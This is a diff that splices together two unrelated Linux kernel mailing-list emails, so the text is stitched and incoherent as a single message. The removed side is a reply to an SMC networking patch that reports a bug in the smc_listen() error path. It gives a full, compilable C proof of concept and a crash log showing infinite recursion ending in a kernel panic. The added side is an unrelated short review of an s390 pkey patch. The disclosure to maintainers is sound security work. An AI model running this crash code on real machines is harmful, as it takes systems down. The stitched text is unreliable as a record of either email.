@@ -1,330 +1,121 @@
-Received: from xmbghk7.mail.qq.com (xmbghk7.mail.qq.com [43.163.128.53])
+Received: from mx0a-001b2d01.pphosted.com (mx0a-001b2d01.pphosted.com [148.163.156.1])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DFC8836EA82;
-	Tue, 23 Jun 2026 10:38:39 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=43.163.128.53
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9F3823D3008
+	for <linux-s390@vger.kernel.org>; Tue, 23 Jun 2026 11:13:10 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=148.163.156.1
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1782211124; cv=none; b=iU01o9v+u7cFaDIADPjwa7EAC+9ZnsdBSNx6SZQqqNYvSFB5zUq8sSjkdxQMpW5OZPQgIUmaugR0DjKGr6XMQGgArdfiQTDfHz3PWK8IyvBVbHfDJxMto7JUEtg7E6K4xrIFUHV1ldD5TKKfbom0qEQSFsZmkxgVdTl4UkJDcBQ=
+	t=1782213191; cv=none; b=UC4AbctUVs5syVJVr0nDK9v7Q+xsDnu/fCSFguGU5IcnIetk6NBy8Ia7lqP3bqHLQD4p+e9FzE8ExFJ6GGE1iw8plcy7ASok1y8J5pCkAj37p+yNCJogqqHcoPcb3X0y9JNRz4KYoMLxB8Jkyl2nFg3qXNBRuqqH4K7J+ZXL7vM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1782211124; c=relaxed/simple;
-	bh=GjVvOsU1Va32xs+5yyrI198u+sBt/gwYvnYnzDA2i9s=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=pIz9hFqdpu88/DeZ8A2SOJwNWmyFjFDsGWqkMb1cFCDCcrpvFcPjJFgaFHVAgHl6gganHG/2r4qC1efNp/fuGmg86g8kkJvdgCwjAYFcFDhNiwtKsT3Pyh+3g+RflImgeeugTIRydEl/vhbP+9k7T0Q9y44KMYN/bMVtc53aanw=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=XDUMjlcf; arc=none smtp.client-ip=43.163.128.53
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
+	s=arc-20240116; t=1782213191; c=relaxed/simple;
+	bh=z1fIKigyP/LEGzjzGDKaqUbQPdErSzjx0TzU+k/ahW8=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=inZIRyluIZJ+O+1ObBV6kVxs4Lb4D5iPka9ViQuIEHEUQWZeg+3LL2eocxBMfmYHRcliFV/C2Xc4eQCm+3yZ5mpmOvSuxc2Pj9+aMQFfuKWhbcg8W3eg2u1JW9jx7Qh0lGZbX7WgNeVxy/cdo6ZVEvsTzyjsgWKlpmHjPJYs59E=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.ibm.com; spf=pass smtp.mailfrom=linux.ibm.com; dkim=pass (2048-bit key) header.d=ibm.com header.i=@ibm.com header.b=fCVwffDq; arc=none smtp.client-ip=148.163.156.1
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.ibm.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.ibm.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="XDUMjlcf"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1782211111; bh=xs46AWO9ZCWqHrnYArh0ceLaWQWFpRk9OCdge+m5N2w=;
-	h=Date:Subject:To:Cc:References:From:In-Reply-To;
-	b=XDUMjlcf60Tr9hYAqOlfcsrEDry44OFregDl4+NyW1KsiTMSCMpoVJPMRS81V+Hfj
-	 w4IMx/rWC7s7G3BpJqGEVZtvxwKr1aAR6Awa94s3h6OxYCizbzWJOnRtRKlxvijJnQ
-	 O1P53m5BzKby2j0+DjLme4pdWsHKVd80bxospmLo=
-Received: from [192.168.3.157] ([115.156.144.140])
-	by newxmesmtplogicsvrszb43-0.qq.com (NewEsmtp) with SMTP
-	id 99B3682F; Tue, 23 Jun 2026 18:38:27 +0800
-X-QQ-mid: xmsmtpt1782211107tosv0a42y
-Message-ID: <tencent_BD4B709F8D16281265EDBC0DC9EFC8758808@qq.com>
-X-QQ-XMAILINFO: NT7uTz3cNku2ya/XYiruYxjttnMLwzQWGrp3TXLfKnJRmYyas7J9vADMeBHY9Z
-	 vzA+6hfltpg13f6OYroTrrcSasXfXPhPXg11hAgoQhj1nHFGiHkaftrbfUSyIZ/7tnISZ+m/voBm
-	 j0EYQj9TeLu/Td0yAb4OpgBVRJsuanypwVmxHSUThIq5zDrx7roNICWxnKycTHbqjVMeimUwJ3pV
-	 J+czxbjINpo/FLuu4uZUMWcJeD+9PqNsFq+BFV/Y0sg5r/EZqSwhf0ulC3rugKEhcfdVjXpu8mTQ
-	 0lOt91Y/BtMSIi0mxEBCXnGn0zBvvJilnKJTLsC8jMrID9/lOwKsPkOcHyz4ei24PU8bfrkjuAU+
-	 qvL26gJUxmYXUyoxgn+1SEZJo1GXEf8byTxlKm2qP8eqKtB+ARgZIdUa9UxIhQ0C13h6axo06f+m
-	 ZEXkg/f8EHGlCk2sEfUs8LBMO8zV3HoXPS7Tz3bKnwXKsaBaSo4jiHZqU+7cu3PdtM3Ia86OyrzH
-	 70EK9qzT/2g9Qk4V3qk64KOcf7sig3mNWlTd+y5UReRs7NsPB0u7b/qwv0G8K8y6BVyuFFZvYPxT
-	 Vhm0UQ8OfCyeuWxt9tN2wt3EQNZrQcZLgIY29vsIMFWUiIcAO1KV571DwBhPHTRekHPI1t8G4ZzJ
-	 ZwH0gdKO4vJwdEhhI934kiJSiZdzbnFjNwWvLUMjpV3dJUV5tY5GtFUdhiXEgC0zHd1P6EtAelKx
-	 k22SPpeFy5hnBH+pyTsG6JLWcowe3poy50NhW/x5awKoW3UpYI//tzbitiBfVxzGHovGslC61GCZ
-	 gpLQpT3+hmgNYfaDCyJgIG9qbxwTXoIlwOGL1TfxYWXoC9k6SHWinJWdUSmOAg/iO2wZ1HAM3/Lf
-	 FVZvR0oF3HnU7IpSPe6hK5o5BqkOTlb9o/RCT/AkZ9S5ltEYX/VwLwFziQNdKyG1L4CC0SLN0V8W
-	 AU82NL49xYn7ah7H/dNJIh4EFRDuDJX4h/Q6ppef13fTznyg7MjrO969oJd4C+Xzn6pZB+FW79Cc
-	 4rN/NlalS4RhDLf9G7tHuyTvLmLUDrUnCBl3fi7iHphFKcTjm+DB8UMTG9emX9/puc3hesJmQCTb
-	 uI0TpJ0m5vGQ7Ur9s=
-X-QQ-XMRINFO: OWPUhxQsoeAVwkVaQIEGSKwwgKCxK/fD5g==
-X-OQ-MSGID: <360fe8a0-3a98-4010-83f3-3fc5d4062a3c@qq.com>
-Date: Tue, 23 Jun 2026 18:38:26 +0800
+	dkim=pass (2048-bit key) header.d=ibm.com header.i=@ibm.com header.b="fCVwffDq"
+Received: from pps.filterd (m0353729.ppops.net [127.0.0.1])
+	by mx0a-001b2d01.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 65N6mP511350652
+	for <linux-s390@vger.kernel.org>; Tue, 23 Jun 2026 11:13:09 GMT
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ibm.com; h=cc
+	:content-type:date:from:in-reply-to:message-id:mime-version
+	:references:subject:to; s=pp1; bh=2g2z9aUziST7vJQm0KhmCbK8gOp5p5
+	5yaX12AwyKcRg=; b=fCVwffDqY0W+Sd2O9F8VyRJ+VbJO+wBJ0CNyWHX3ZZq2d5
+	fHvi6fjiz07rUa0w8lYpkFPG3aBrYXHzPcRCY1pQXPtSTBOBvXm7eLaY3VkUOXzS
+	03I/OvbZRQx+GhCQPu3B4FOvGEJZ91I9dAZ1gPQJI944rZ76G1UjONJluYVFbKYO
+	kGdTnGjPpGq/MfYhVuNgDt8UutxjJuSgNMtagoQIuhyZuBBem8b212/yQgPJ83UJ
+	dVVvCfBHHRl8Tz2gmoS+bCN64jF76g5T9NXcitpsN4/B7npgLRWbBXmW/QQBRjVG
+	GTh7wGcrTaWA045fCeCiPbbnHP9C7icrH4z18zhg==
+Received: from ppma21.wdc07v.mail.ibm.com (5b.69.3da9.ip4.static.sl-reverse.com [169.61.105.91])
+	by mx0a-001b2d01.pphosted.com (PPS) with ESMTPS id 4ewjhqp1uf-1
+	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT)
+	for <linux-s390@vger.kernel.org>; Tue, 23 Jun 2026 11:13:09 +0000 (GMT)
+Received: from pps.filterd (ppma21.wdc07v.mail.ibm.com [127.0.0.1])
+	by ppma21.wdc07v.mail.ibm.com (8.18.1.7/8.18.1.7) with ESMTP id 65NB50j0029101
+	for <linux-s390@vger.kernel.org>; Tue, 23 Jun 2026 11:13:08 GMT
+Received: from smtprelay07.fra02v.mail.ibm.com ([9.218.2.229])
+	by ppma21.wdc07v.mail.ibm.com (PPS) with ESMTPS id 4ex66k2weq-1
+	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT)
+	for <linux-s390@vger.kernel.org>; Tue, 23 Jun 2026 11:13:08 +0000 (GMT)
+Received: from smtpav02.fra02v.mail.ibm.com (smtpav02.fra02v.mail.ibm.com [10.20.54.101])
+	by smtprelay07.fra02v.mail.ibm.com (8.14.9/8.14.9/NCO v10.0) with ESMTP id 65NBD4cs39256530
+	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
+	Tue, 23 Jun 2026 11:13:04 GMT
+Received: from smtpav02.fra02v.mail.ibm.com (unknown [127.0.0.1])
+	by IMSVA (Postfix) with ESMTP id A00ED20043;
+	Tue, 23 Jun 2026 11:13:04 +0000 (GMT)
+Received: from smtpav02.fra02v.mail.ibm.com (unknown [127.0.0.1])
+	by IMSVA (Postfix) with ESMTP id 831A220040;
+	Tue, 23 Jun 2026 11:13:04 +0000 (GMT)
+Received: from li-008a6a4c-3549-11b2-a85c-c5cc2836eea2.ibm.com (unknown [9.224.92.206])
+	by smtpav02.fra02v.mail.ibm.com (Postfix) with ESMTPS;
+	Tue, 23 Jun 2026 11:13:04 +0000 (GMT)
+Date: Tue, 23 Jun 2026 13:13:03 +0200
+From: Alexander Gordeev <agordeev@linux.ibm.com>
+To: Holger Dengler <dengler@linux.ibm.com>
+Cc: Harald Freudenberger <freude@linux.ibm.com>,
+        Ingo Franzki <ifranzki@linux.ibm.com>, linux-s390@vger.kernel.org,
+        Heiko Carstens <hca@linux.ibm.com>, Vasily Gorbik <gor@linux.ibm.com>
+Subject: Re: [PATCH v2 1/1] pkey: Fix for PKEY_VERIFYPROTK iotl
+Message-ID: <05c89f53-760a-4014-bdba-6aa58d86c7cf-agordeev@linux.ibm.com>
+References: <20260623102016.3930343-1-dengler@linux.ibm.com>
+ <20260623102016.3930343-2-dengler@linux.ibm.com>
 Precedence: bulk
 X-Mailing-List: linux-s390@vger.kernel.org
 List-Id: <linux-s390.vger.kernel.org>
 List-Subscribe: <mailto:linux-s390+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-s390+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH net v2] net/smc: avoid recursive sk_callback_lock in
- listen data_ready
-To: Runyu Xiao <runyu.xiao@seu.edu.cn>, "D. Wythe"
- <alibuda@linux.alibaba.com>, Dust Li <dust.li@linux.alibaba.com>,
- Sidraya Jayagond <sidraya@linux.ibm.com>, Wenjia Zhang
- <wenjia@linux.ibm.com>, "David S. Miller" <davem@davemloft.net>,
- Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
- Paolo Abeni <pabeni@redhat.com>
-Cc: Mahanta Jambigi <mjambigi@linux.ibm.com>,
- Tony Lu <tonylu@linux.alibaba.com>, Wen Gu <guwen@linux.alibaba.com>,
- Simon Horman <horms@kernel.org>, Karsten Graul <kgraul@linux.ibm.com>,
- linux-rdma@vger.kernel.org, linux-s390@vger.kernel.org,
- netdev@vger.kernel.org, linux-kernel@vger.kernel.org, jianhao.xu@seu.edu.cn,
- stable@vger.kernel.org
-References: <20260617152855.1039151-1-runyu.xiao@seu.edu.cn>
- <20260619054815.176764-1-runyu.xiao@seu.edu.cn>
-From: XIAO WU <xiaowu.417@qq.com>
-In-Reply-To: <20260619054815.176764-1-runyu.xiao@seu.edu.cn>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20260623102016.3930343-2-dengler@linux.ibm.com>
+X-TM-AS-GCONF: 00
+X-Authority-Analysis: v=2.4 cv=I4VVgtgg c=1 sm=1 tr=0 ts=6a3a6a45 cx=c_pps
+ a=GFwsV6G8L6GxiO2Y/PsHdQ==:117 a=GFwsV6G8L6GxiO2Y/PsHdQ==:17
+ a=kj9zAlcOel0A:10 a=FelO9ux0wxsA:10 a=VkNPw1HP01LnGYTKEx00:22
+ a=RnoormkPH1_aCDwRdu11:22 a=uAbxVGIbfxUO_5tXvNgY:22 a=VwQbUJbxAAAA:8
+ a=VnNF1IyMAAAA:8 a=F7KASwOF8UQbQQfWccoA:9 a=CjuIK1q_8ugA:10 a=zZCYzV9kfG8A:10
+X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwNjIzMDA4OCBTYWx0ZWRfX/+wWPRfQpCB6
+ 1tLaErkRpMH+D0p2RTs6mwFLa100Ail/RgGDHgYCTEGjjA/k5MDyvKur5GoBfNzIVriXiBYgqw3
+ 9fOBPb4FJ2KO0HYrBaPo3aOKCetxdB8oehpSuYGMrslGPUZQj1M677oYgG1Nk3ItIDFFLDYJKax
+ d0PUopSFTcBkclCyKCmxYE3I+DwM5MP6qpGBvCn5NVnGzyqHnzl3OKvOClduVYDfLvIb8JarqgU
+ EwQMRJ1dTNRXMlMuEmwHAAE8dVNXXeh1CV3rkUXvX/s5H8Xt/1bWWs1qbba2/aM6zbeKeMf3smN
+ TeHnUYvNUQml+fc7iG589XFF6EVagQ5nahM++KjeFLR3+IcR5jDUUU2x6tOB69r1iheMCXZu0tC
+ AbwQUO6loQ85WiCGCg/eDSeeKdB80YSxrxf+RRawkkaJTD1EEfqJN5mnflLQj3/bTIlLlvuVxBs
+ 2lq4QRm6hLgXsZD/zsQ==
+X-Proofpoint-GUID: TuoGVqy4jvrUiKuRKAP9fAx0i29Wa97a
+X-Proofpoint-ORIG-GUID: TuoGVqy4jvrUiKuRKAP9fAx0i29Wa97a
+X-Proofpoint-Spam-Info: AW1haW4tMjYwNjIzMDA4OCBTYWx0ZWRfX/s0fsdXkFAxN
+ /KlR02f3VZH3Emg8pAEvrncBpNMJe73kEQXNPn+AT1lMKs62e6bFvcOdzjNj3jQjtWo/+dew1mP
+ KLAnoJcfUZhNPfJoDPOIB2hGQf6LS8Y=
+X-Proofpoint-Virus-Version: vendor=baseguard
+ engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.125,FMLib:17.12.100.49
+ definitions=2026-06-23_02,2026-06-22_01,2025-10-01_01
+X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0
+ lowpriorityscore=0 malwarescore=0 clxscore=1015 impostorscore=0
+ suspectscore=0 phishscore=0 bulkscore=0 spamscore=0 priorityscore=1501
+ adultscore=0 classifier=typeunknown authscore=0 authtc= authcc=
+ route=outbound adjust=0 reason=mlx scancount=1 engine=8.22.0-2606150000
+ definitions=main-2606230088
 
-Hi Runyu,
+On Tue, Jun 23, 2026 at 12:20:16PM +0200, Holger Dengler wrote:
+> Remove the keytype calculation based on key length. The verification,
+> including the keytype check, is the responsibility of the pkey
+> handler.
+> 
+> The removal also fixes a bug in the key-length calculation, which is
+> now no longer required.
+> 
+> Cc: stable@kernel.org # 6.12+
+> Fixes: 8fcc231ce3be ("s390/pkey: Introduce pkey base with handler registry and handler modules")
+> Signed-off-by: Holger Dengler <dengler@linux.ibm.com>
+> ---
+>  drivers/s390/crypto/pkey_api.c | 11 +----------
+>  1 file changed, 1 insertion(+), 10 deletions(-)
 
-Thanks for this patch.
+The patch description is too indescriptive.
+Could you please suggest a more specific one?
 
- > diff --git a/net/smc/af_smc.c b/net/smc/af_smc.c
- > index 6421c2e1c84d..1af4e3c333ff 100644
- > --- a/net/smc/af_smc.c
- > +++ b/net/smc/af_smc.c
- > @@ -2631,6 +2631,9 @@ static void smc_clcsock_data_ready(struct sock 
-*listen_clcsock)
- >  {
- >      struct smc_sock *lsmc;
- >
- > +    if (READ_ONCE(listen_clcsock->sk_state) != TCP_LISTEN)
- > +        return;
- > +
- >      read_lock_bh(&listen_clcsock->sk_callback_lock);
- >      lsmc = smc_clcsock_user_data(listen_clcsock);
-
-The TCP_LISTEN check before taking sk_callback_lock looks correct and
-mirrors the same pattern from nvmet TCP.
-
-Sashiko AI review also looked at this patch and flagged a separate
-pre-existing issue nearby — the error path in smc_listen() does not
-restore icsk_af_ops when kernel_listen() fails:
-
-https://sashiko.dev/#/patchset/20260617152855.1039151-1-runyu.xiao@seu.edu.cn
-
-The relevant code in smc_listen() (net/smc/af_smc.c, lines ~2687-2704):
-
-         smc->ori_af_ops = inet_csk(smc->clcsock->sk)->icsk_af_ops;
-
-         smc->af_ops = *smc->ori_af_ops;
-         smc->af_ops.syn_recv_sock = smc_tcp_syn_recv_sock;
-
-         inet_csk(smc->clcsock->sk)->icsk_af_ops = &smc->af_ops;
-
-         if (smc->limit_smc_hs)
-                 tcp_sk(smc->clcsock->sk)->smc_hs_congested = 
-smc_hs_congested;
-
-         rc = kernel_listen(smc->clcsock, backlog);
-         if (rc) {
-write_lock_bh(&smc->clcsock->sk->sk_callback_lock);
-smc_clcsock_restore_cb(&smc->clcsock->sk->sk_data_ready,
-  &smc->clcsk_data_ready);
-                 rcu_assign_sk_user_data(smc->clcsock->sk, NULL);
-write_unlock_bh(&smc->clcsock->sk->sk_callback_lock);
-                 goto out;
-         }
-
-The error path restores sk_data_ready and sk_user_data but leaves
-icsk_af_ops pointing to &smc->af_ops (whose syn_recv_sock is already
-set to smc_tcp_syn_recv_sock).  I verified this in a QEMU VM and can
-confirm it triggers a real kernel stack overflow.
-
-=== Reproduction ===
-
-Kernel: 7.1.0-rc7-gfa471042f07a #1 SMP PREEMPT_DYNAMIC x86_64
-Config: ci-qemu-upstream.config (KASAN=y, CONFIG_SMC=y, DEBUG_LIST=y)
-QEMU: qemu-system-x86_64 -m 2G -smp 2
-
-Trigger sequence:
-   1. SMC socket A: setsockopt(SO_REUSEADDR), bind to port P
-      → clcsock gets SO_REUSEADDR via smc_bind() copy
-   2. TCP socket C: setsockopt(SO_REUSEADDR), bind + listen on port P
-      → Both non-TCP_LISTEN at bind time → bind OK
-      → C enters TCP_LISTEN after its listen()
-   3. listen(A) on SMC → kernel_listen() fails with EADDRINUSE
-      → icsk_af_ops NOT restored → clcsock points to wrapper
-   4. Close TCP C (free port), listen(A) again → succeeds
-      → ori_af_ops now points to wrapper with syn_recv_sock = 
-smc_tcp_syn_recv_sock
-   5. TCP connect() to port P → smc_tcp_syn_recv_sock calls itself
-      → infinite recursion → IRQ stack guard page hit → kernel panic
-
-=== Full PoC ===
-
-Compile with: gcc -o poc poc.c -static
-
-// PoC: Stack overflow via corrupted icsk_af_ops in smc_listen error path
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/wait.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-
-#ifndef PF_SMC
-#define PF_SMC 43
-#endif
-#ifndef SMCPROTO_SMC
-#define SMCPROTO_SMC 0
-#endif
-
-int main(void)
-{
-     int smc_a, tcp_c, client;
-     struct sockaddr_in addr;
-     pid_t child;
-     int status, ret;
-     socklen_t len;
-     int val;
-
-     printf("=== SMC listen error path -> stack overflow PoC ===\n\n");
-
-     /* Step 1: SMC socket A with SO_REUSEADDR, bind to any free port */
-     printf("[1] Create SMC socket A with SO_REUSEADDR\n");
-     smc_a = socket(PF_SMC, SOCK_STREAM, 0);
-     if (smc_a < 0) { perror("smc socket"); return 1; }
-     val = 1;
-     setsockopt(smc_a, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
-
-     memset(&addr, 0, sizeof(addr));
-     addr.sin_family = AF_INET;
-     addr.sin_addr.s_addr = htonl(INADDR_ANY);
-     addr.sin_port = 0;
-     if (bind(smc_a, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-         perror("bind smc_a"); close(smc_a); return 1;
-     }
-     len = sizeof(addr);
-     if (getsockname(smc_a, (struct sockaddr *)&addr, &len) < 0) {
-         perror("getsockname"); close(smc_a); return 1;
-     }
-     int port = ntohs(addr.sin_port);
-     printf("  SMC A bound to port %d\n", port);
-
-     /* Step 2: TCP socket C with SO_REUSEADDR, bind+listen on same port */
-     printf("[2] TCP C with SO_REUSEADDR, bind+listen on port %d\n", port);
-     tcp_c = socket(AF_INET, SOCK_STREAM, 0);
-     val = 1;
-     setsockopt(tcp_c, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
-     memset(&addr, 0, sizeof(addr));
-     addr.sin_family = AF_INET;
-     addr.sin_addr.s_addr = htonl(INADDR_ANY);
-     addr.sin_port = htons(port);
-     if (bind(tcp_c, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-         perror("bind tcp_c"); close(tcp_c); close(smc_a); return 1;
-     }
-     if (listen(tcp_c, 5) < 0) {
-         perror("listen tcp_c"); close(tcp_c); close(smc_a); return 1;
-     }
-     printf("  TCP C listening on port %d\n", port);
-
-     /* Step 3: listen(A) should FAIL → icsk_af_ops NOT restored */
-     printf("[3] listen(SMC A) — expect failure... ");
-     fflush(stdout);
-     ret = listen(smc_a, 5);
-     if (ret == 0) {
-         printf("succeeded! Unexpected.\n");
-         close(tcp_c); close(smc_a);
-         return 1;
-     }
-     printf("failed: %s\n", strerror(errno));
-
-     /* Step 4: Close TCP C to free the port */
-     printf("[4] Close TCP C to free port %d\n", port);
-     close(tcp_c);
-     sleep(1);
-
-     /* Step 5: listen(A) again → succeeds but ori_af_ops is 
-self-referential */
-     printf("[5] listen(SMC A) again... ");
-     fflush(stdout);
-     ret = listen(smc_a, 5);
-     if (ret < 0) {
-         printf("failed: %s, retrying...\n", strerror(errno));
-         sleep(2);
-         ret = listen(smc_a, 5);
-     }
-     if (ret < 0) {
-         perror("retry"); close(smc_a); return 1;
-     }
-     printf("succeeded! ori_af_ops->syn_recv_sock == 
-smc_tcp_syn_recv_sock\n");
-
-     /* Step 6: TCP connect → smc_tcp_syn_recv_sock recursion → STACK 
-OVERFLOW */
-     printf("[6] TCP connect → triggers infinite recursion...\n");
-     fflush(stdout);
-
-     child = fork();
-     if (child == 0) {
-         client = socket(AF_INET, SOCK_STREAM, 0);
-         if (client < 0) exit(1);
-         memset(&addr, 0, sizeof(addr));
-         addr.sin_family = AF_INET;
-         addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
-         addr.sin_port = htons(port);
-         if (connect(client, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-             perror("connect");
-             exit(1);
-         }
-         sleep(3);
-         close(client);
-         exit(0);
-     }
-
-     printf("Waiting for crash...\n");
-     sleep(5);
-     if (waitpid(child, &status, WNOHANG) == 0) {
-         printf("Child still alive — check dmesg\n");
-         kill(child, SIGKILL);
-         waitpid(child, NULL, 0);
-     }
-     close(smc_a);
-     return 0;
-}
-
-=== Crash Log ===
-
-Linux syzkaller 7.1.0-rc7-gfa471042f07a #1 SMP PREEMPT_DYNAMIC x86_64
-(CONFIG_KASAN=y, CONFIG_SMC=y, CONFIG_DEBUG_LIST=y)
-
-[ 1453.562682][    C0] BUG: IRQ stack guard page was hit at 
-ffffc8ffffffff98 (stack is ffffc90000000000..ffffc90000008000)
-[ 1453.562712][    C0] Oops: stack guard page: 0000 [#1] SMP KASAN NOPTI
-[ 1453.562733][    C0] CPU: 0 UID: 0 PID: 10840 Comm: poc Not tainted 
-7.1.0-rc7-gfa471042f07a #1 PREEMPT(full)
-[ 1453.562756][    C0] Hardware name: QEMU Standard PC (Q35 + ICH9, 
-2009), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[ 1453.562767][    C0] RIP: 0010:__lock_acquire+0x417/0x2730
-[ 1453.562965][    C0] Call Trace:
-[ 1453.562970][    C0]  <IRQ>
-[ 1453.562980][    C0]  lock_acquire+0x1ae/0x360
-[ 1453.562995][    C0]  ? smc_tcp_syn_recv_sock+0xab/0xb10
-[ 1453.563031][    C0]  smc_tcp_syn_recv_sock+0xbf/0xb10
-[ 1453.563051][    C0]  ? smc_tcp_syn_recv_sock+0xab/0xb10
-[ 1453.563073][    C0]  ? __pfx_smc_tcp_syn_recv_sock+0x10/0x10
-[ 1453.563114][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.563158][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.563200][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.563244][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-                         [... 15+ recursive frames ...]
-[ 1453.564373][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.564413][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.577027][    C0] RIP: 0033:0x423574
-[ 1453.577319][    C0] Kernel panic - not syncing: Fatal exception in 
-interrupt
-
-The infinite recursion is visible in the repeated
-smc_tcp_syn_recv_sock+0x435/0xb10 frames — each iteration calls
-ori_af_ops->syn_recv_sock(), which is itself, pushing a new frame
-until the IRQ stack guard page is hit.
-
-Thanks,
-Xiao
-
-
+Thanks!
